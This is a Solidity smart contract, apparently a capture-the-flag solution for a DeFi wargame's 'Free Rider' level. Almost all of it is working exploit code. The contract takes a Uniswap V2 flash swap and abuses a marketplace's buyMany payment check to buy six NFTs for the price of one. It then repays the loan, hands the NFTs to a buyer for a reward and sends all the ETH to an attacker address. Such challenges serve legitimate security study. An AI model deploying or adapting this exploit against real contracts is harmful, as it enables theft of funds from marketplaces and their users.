// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Factory {
  function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface INFT {
  function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IMarketplace {
  function buyMany(uint256[] calldata tokenIds) external payable;
  function token() external returns (address);
}


/**
 * @title AttackFreeRider
 */
contract AttackFreeRider {

    IUniswapV2Factory factory;
    IMarketplace marketplace;
    address TOKEN;
    address WETH;
    uint256 price;

    constructor(uint256 _price, address _factory, address _marketplace, address _token, address _weth) {
      factory = IUniswapV2Factory(_factory);
      marketplace = IMarketplace(_marketplace);
      TOKEN = _token;
      WETH = _weth;
      price = _price;
    }

    function run(address _attacker, address _buyer) external {
        address pair = factory.getPair(TOKEN, WETH);

        bytes memory data = abi.encode(WETH, price);

        IUniswapV2Pair(pair).swap(price, 0, address(this), data);
        
        // send tokens to buyer and receive ETH reward
        for (uint i=0; i<6; i++) {
            INFT(marketplace.token()).safeTransferFrom(address(this), _buyer, i);
        }

        // send all the ETH received to the attacker address
        (bool success,) = _attacker.call{value: address(this).balance}("");   
        assert(success);

    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); 
        address token1 = IUniswapV2Pair(msg.sender).token1(); 
        assert(msg.sender == factory.getPair(token0, token1)); 

        // deposit WETH to get (15) ETH
        IWETH(token0).withdraw(price);

        uint[] memory tokenIds = new uint[](6);
        for (uint i=0; i<tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        // offer 15 ETH for each token
        marketplace.buyMany{value: price}(tokenIds);

        // amount + fee
        uint256 amount = price + (price * 3 / 997) + 1;
        IWETH(token0).deposit{value: amount}();
        assert(IWETH(token0).transfer(msg.sender, amount));

    }
  
    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

}
